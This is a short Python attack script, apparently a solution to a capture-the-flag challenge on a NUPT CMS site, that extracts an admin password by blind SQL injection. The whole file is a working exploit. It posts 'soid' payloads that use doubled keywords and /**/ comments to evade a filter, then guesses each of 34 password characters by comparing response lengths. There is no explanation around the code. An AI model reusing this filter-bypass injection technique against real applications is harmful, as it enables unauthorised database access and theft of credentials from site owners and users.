#!/usr/bin/env python3

# 破解表中长度为34位的密码
import requests

url = 'http://cms.nuptzj.cn/so.php'
header = {
    'Host': 'cms.nuptzj.cn',
    'User-Agent': 'Xlcteam Browser'
}

password = ''

for i in range(1,35): # 密码一共34位
    for j in range(48,58): # 0-9的ascii码
        payload = ('1/**/anandd/**/exists(selselectect/**/*/**/frfromom/**/admadminin/**/where/**/ascii(mid(userpapassss,%s,1))>%s)' % (i,j))
        data = {
            'soid': payload
        }
        response = requests.post(url=url, headers=header, data=data)

        if len(response.content) < 600: # 如果没有回显，即猜解成功
            password += chr(j) # ascii码转数字字符
            print("[*] Fetching the password:", password)
            break
